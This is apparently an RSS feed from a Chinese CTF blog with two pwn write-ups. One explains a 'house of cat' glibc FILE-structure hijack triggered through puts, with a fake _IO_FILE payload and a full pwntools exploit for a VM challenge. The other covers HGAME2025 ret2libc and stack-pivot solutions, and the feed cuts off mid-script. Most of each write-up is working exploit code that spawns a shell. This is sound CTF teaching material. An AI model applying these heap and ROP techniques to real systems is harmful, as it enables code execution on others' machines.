<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>feichai&#39;s Blog</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>柴柴就是世界第一可爱！！!</description>
    <pubDate>Wed, 12 Mar 2025 12:17:57 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>house of cat在puts中的利用</title>
      <link>http://example.com/2025/03/12/house-of-cat%E5%9C%A8puts%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/</link>
      <guid>http://example.com/2025/03/12/house-of-cat%E5%9C%A8puts%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
      <pubDate>Wed, 12 Mar 2025 07:27:08 GMT</pubDate>
      
      <description>&lt;p&gt;笔者在复现 ccsssc18 的 vm pwn时，偶然发现了另一种可以通过puts触发 house of cat 调用链的方法，故做此笔记&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>笔者在复现 ccsssc18 的 vm pwn时，偶然发现了另一种可以通过puts触发 house of cat 调用链的方法，故做此笔记</p><span id="more"></span><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>一次任意地址写大堆块</p><p>能够调用puts函数</p><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>glibc 2.35-0ubuntu3.8_amd64</p><h4 id="发现过程"><a href="#发现过程" class="headerlink" title="发现过程"></a>发现过程</h4><p>在笔者调试<strong>puts函数</strong>的过程中，偶然发现了<strong>puts函数</strong>中存在这样一段代码</p><p>先取出 <strong>_IO_2_1_stdout_</strong> 给 r13，也就是 <strong>_IO_2_1_stdout_</strong> 的 <strong>flags</strong>，然后将其和<strong>0x8000</strong>，即和 <strong>_IO_USER_LOCK</strong> 相与，若相与后eax为0x8000则跳转</p><p>即 <strong>flags &#x3D; 0x00008000</strong> 就是为了绕过 _IO_acquire_lock </p><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-1.png" alt="house-of-dog-1"></p><p>源码如下</p><p><img src="/imgs/$%7Bfiilename%7D/house-of-cat-puts-7-17417789663411.png" alt="house-of-cat-puts-7"></p><p><img src="/imgs/$%7Bfiilename%7D/house-of-cat-puts-8.png" alt="house-of-cat-puts-8"></p><p>跳转后来到这里</p><p>取 [rdx + 0xc0] 赋值给 eax，即为<strong>IO_file结构体</strong>中的 <strong>mode</strong> 字段</p><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-2.png" alt="house-of-dog-2"></p><p>此时，我们<strong>设置mode字段为0</strong>，就可一路畅通，执行到以下代码</p><p>puts+159 就是吧 <strong>vtable</strong> 取出来，然后<strong>call [vtable+0x38]</strong></p><p>从这里开始即为<strong>house of cat的调用链</strong>，在此之前，我已将<strong>vtable</strong> 劫持为 <strong>_IO_wfile_jumps+0x10</strong>,所以这里所显示的即为<strong>_IO_wfile_seekoff</strong></p><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-3.png" alt="house-of-dog-3"></p><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-4.png" alt="house-of-dog-4"></p><p>在源码中如下，其实就相当于把 <strong>_IO_sputn</strong> 改成了 <strong>_IO_wfile_seekoff</strong></p><p><img src="/imgs/$%7Bfiilename%7D/house-of-cat-puts-9.png" alt="house-of-cat-puts-9"></p><p>还有一个需要注意的点，在 house of cat 中也有提及，在下图代码中需要满足以下条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line"></span><br><span class="line">如果_wide_data=fake_io_addr+<span class="number">0x30</span>,那么就等同于</span><br><span class="line">fake_IO_FILE-&gt;_IO_save_base &lt; fake_IO_FILE-&gt;_IO_backup_base</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-6.png" alt="house-of-dog-6"></p><p>根据house of cat伪造好结构体后，调用链如下</p><p><strong>_IO_puts   —-&gt;  _IO_wfile_seekoff   —-&gt;     _IO_switch_to_wget_mode</strong></p><p>最终在 <strong>_IO_switch_to_wget_mode</strong> 执行我们的代码</p><p><img src="/imgs/$%7Bfiilename%7D/house-of-dog-5.png" alt="house-of-dog-5"></p><p>最终构造的 <strong>fake_IO_FILE</strong> 如下，大致看着和house of cat差不多，但是还是有些出入</p><p>如下</p><ul><li><p><strong>flags &#x3D; 0x00008000</strong></p></li><li><p><strong>_IO_backup_base  &gt; _IO_save_base    (1&gt;0)</strong></p></li><li><p><strong>无需设置 _lock字段为可写地址</strong></p></li><li><p><strong>mode &#x3D; 0</strong></p></li></ul><p>注：我在下方写为 flags &#x3D; 0x01018001 是因为最后执行system函数时，如果有\x00字节，system就执行不到sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr =  _IO_2_1_stdout_ <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">fake_IO_FILE =  <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO_FILE += p32(<span class="number">0x01018001</span>)+<span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(system) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1  [rax+0xe0]</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) <span class="comment">#mode=0</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = call addr</span></span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>全程跟着这位师傅完成的逆向，真的是一场酣畅淋漓的逆向，膜拜大佬</p><p><a href="https://xz.aliyun.com/news/16480">文章 - 记一次题型VM-软件系统安全赛-pwn- - 先知社区</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;../ctf_file/vm&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">    io = process(elf.path)</span><br><span class="line">    <span class="keyword">if</span> args.G:</span><br><span class="line">        gdb.attach(io, SET_TERMINAL+<span class="string">&quot;b _IO_switch_to_wget_mode\nb puts\nb read&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;<span class="built_in">eval</span>(s):02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">case</span>(<span class="params">fun1,fun2</span>):</span><br><span class="line">    <span class="keyword">return</span> p8((fun2 &lt;&lt; <span class="number">2</span>) | (fun1 &amp; <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_reg</span>(<span class="params">reg,val</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">case</span>(<span class="number">3</span>,<span class="number">3</span>)+p8(reg)+p64(val)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_read</span>(<span class="params">fd,offset,size</span>):</span><br><span class="line">    data = set_reg(<span class="number">0</span>,fd)</span><br><span class="line">    data += set_reg(<span class="number">1</span>,offset)</span><br><span class="line">    data += set_reg(<span class="number">2</span>,size)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x35</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  + p8(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_write</span>(<span class="params">fd,offset,size</span>):</span><br><span class="line">    data = set_reg(<span class="number">0</span>,fd)</span><br><span class="line">    data += set_reg(<span class="number">1</span>,offset)</span><br><span class="line">    data += set_reg(<span class="number">2</span>,size)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x35</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  + p8(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    data = set_reg(<span class="number">0</span>,size)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x33</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  +p8(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    data = set_reg(<span class="number">0</span>,idx)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x33</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  + p8(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>():</span><br><span class="line">    <span class="keyword">return</span> call_write(<span class="number">1</span>,<span class="number">18</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size</span>):</span><br><span class="line">    data =  printf()</span><br><span class="line">    data += call_read(<span class="number">0</span>,<span class="number">0x1000</span>,size)</span><br><span class="line">    data += set_reg(<span class="number">0</span>,idx)</span><br><span class="line">    data += set_reg(<span class="number">1</span>,<span class="number">0x1000</span>)</span><br><span class="line">    data += set_reg(<span class="number">2</span>,size)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x33</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  + p8(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx,size</span>):</span><br><span class="line">    data = set_reg(<span class="number">0</span>,idx)</span><br><span class="line">    data += set_reg(<span class="number">1</span>,<span class="number">0x2000</span>)</span><br><span class="line">    data += set_reg(<span class="number">2</span>,size)</span><br><span class="line">    data += <span class="keyword">case</span>(<span class="number">0</span>,<span class="number">0x33</span>) + p8(<span class="number">0</span>)*<span class="number">2</span>  + p8(<span class="number">6</span>)</span><br><span class="line">    data += call_write(<span class="number">1</span>,<span class="number">0x2000</span>,size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">pd =  add(<span class="number">0x420</span>) <span class="comment"># 0</span></span><br><span class="line">pd += add(<span class="number">0x3f8</span>) <span class="comment"># 1</span></span><br><span class="line">pd += add(<span class="number">0x3f0</span>) <span class="comment"># 2</span></span><br><span class="line">pd += free(<span class="number">0</span>)</span><br><span class="line">pd += show(<span class="number">0</span>,<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># attack tcache</span></span><br><span class="line">pd += free(<span class="number">1</span>)</span><br><span class="line">pd += free(<span class="number">2</span>)</span><br><span class="line">pd += show(<span class="number">1</span>,<span class="number">5</span>)</span><br><span class="line">pd += edit(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">pd += add(<span class="number">0x3f0</span>) <span class="comment"># 3</span></span><br><span class="line">pd += add(<span class="number">0x3f0</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_IO</span></span><br><span class="line">pd += edit(<span class="number">4</span>,<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Please input your opcodes:\n&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sa(<span class="string">&quot;opcodes:&quot;</span>,p64(_IO_2_1_stdout_^key))</span><br><span class="line"></span><br><span class="line">fake_io_addr  = _IO_2_1_stdout_ <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">fake_IO_FILE  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO_FILE += p32(<span class="number">0x01018001</span>)+<span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#_IO_backup_base=rdx </span></span><br><span class="line">fake_IO_FILE += p64(system) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1  [rax+0xe0]</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) <span class="comment">#mode=0</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>) <span class="comment"># vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = call addr</span></span><br><span class="line">sa(<span class="string">&quot;opcodes:&quot;</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/io-file/">io_file</category>
      
      <category domain="http://example.com/tags/house-of-cat/">house of cat</category>
      
      <category domain="http://example.com/tags/vm-pwn/">vm pwn</category>
      
      
      <comments>http://example.com/2025/03/12/house-of-cat%E5%9C%A8puts%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HGAME2025 pwn writeup</title>
      <link>http://example.com/2025/02/18/HGAME2025-pwn-writeup/</link>
      <guid>http://example.com/2025/02/18/HGAME2025-pwn-writeup/</guid>
      <pubDate>Tue, 18 Feb 2025 12:04:38 GMT</pubDate>
      
      <description>&lt;p&gt;HGAME2025 pwn writeup&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>HGAME2025 pwn writeup</p><span id="more"></span><h3 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a><strong>counting petals</strong></h3><p>数组最后一个越界，可以改v8，也就是用于计数变量，通过程序打印可以泄露栈上数据，最后ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;this time?&#x27;</span>,<span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1400000014</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;latter:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;85899345940 + &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>,drop=<span class="literal">True</span>),<span class="number">10</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;+ 1 + &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>,drop=<span class="literal">True</span>),<span class="number">10</span>) - <span class="number">0x29d90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary:&quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;this time?&#x27;</span>,<span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1200000016</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(pop_rdi))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(binsh))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(ret))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;latter:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t recv&quot;</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a><strong>ezstack</strong></h3><p>这题没直接给libc，需要拉取Docker，得到版本 Ubuntu GLIBC 2.31-0ubuntu9.16</p><p>程序开了一个子进程，输入输出共用一个管道，文件描述符为4</p><p>主要是栈迁移，但是要注意文件描述符的合法性，选择返回地址时要注意汇编代码是如何设置rdi的</p><p>data段上有一个gift，给了你0~9的10个数字，应该是用于设置read的rdi，可以通过栈迁移把rbp迁到0x404100+0x54的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000404100 04           db    4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004013CD        fd              = dword ptr -54h</span><br><span class="line"></span><br><span class="line">.text:000000000040140F 48 8D 4D B0      lea     rcx, [rbp+buf]</span><br><span class="line">.text:0000000000401413 8B 45 AC         mov     eax, [rbp+fd]</span><br><span class="line">.text:0000000000401416 BA 60 00 00 00   mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">.text:000000000040141B 48 89 CE         mov     rsi, rcx        ; buf</span><br><span class="line">.text:000000000040141E 89 C7            mov     edi, eax        ; fd</span><br><span class="line">.text:0000000000401420 E8 DB FD FF FF   call    _read</span><br></pre></td></tr></table></figure><p>但是如果选择返回地址为0x4013D9的话就用不到上面这个gift，因为从这里开始会把先前的fd存起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004013D9 89 7D AC         mov     [rbp+fd], edi</span><br></pre></td></tr></table></figure><p>0x4013CD这个地址vuln函数的开头，从这里开始是用于控制rsp，不然rsp会乱跑，跑到一个不可写的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004013D1 55               push    rbp</span><br><span class="line">.text:00000000004013D2 48 89 E5         mov     rbp, rsp</span><br></pre></td></tr></table></figure><p>禁用execve和execveat</p><p>最后栈迁移的话就多迁几次，第一次泄露libc，第二次调用read扩展字节读入orw，第三次迁移到orw读flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 